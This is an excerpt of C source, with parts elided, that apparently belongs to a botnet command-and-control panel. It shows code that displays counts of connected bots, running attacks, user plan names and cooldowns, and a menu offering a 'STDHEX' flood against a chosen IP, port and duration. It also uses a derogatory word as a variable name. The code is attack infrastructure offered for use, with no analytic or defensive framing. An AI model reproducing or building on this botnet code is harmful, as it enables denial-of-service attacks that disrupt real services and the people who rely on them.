    ...
    while(1) {
		...
		if(gay[datafd].login == 2)
		{
        	...
        	{	
        		if(attacksrunning > 0)
        		{
        			sprintf(string, "%c]0; BOTS/ROOTS: %d | %s | %s | Attacks Running: %d | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		} else 
        		{
        			sprintf(string, "%c]0; BOTS/ROOTS: %d | %s | %s | Cooldown: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, managements[datafd].mycooldown - managements[datafd].cooldownsecs, '\007');
        		}
        	} 
        	else if(managements[datafd].cooldownstatus == 0)
        	{
        		if(attacksrunning > 0) 
        		{
        			sprintf(string, "%c]0; BOTS/ROOTS: %d | %s | %s | Attacks Running: %d %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, attacksrunning, '\007');
        		} else {
        			sprintf(string, "%c]0; BOTS/ROOTS: %d | %s | %s %c", '\033', botsconnect(), managements[datafd].id, managements[datafd].planname, '\007');
        		}
        	}
        }
    ...
    while(j!=i-1) {
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {   
 			...
 			if(strcasestr(buf, "method"))
 			{
        	    ...
        	    sprintf(attack8,   "              \e[38;5;54m║  \e[97m!* NFO IP PORT TIME       \e[38;5;124m---\e[38;5;14mCustom STDHEX Flood  \e[38;5;54m║\r\n");
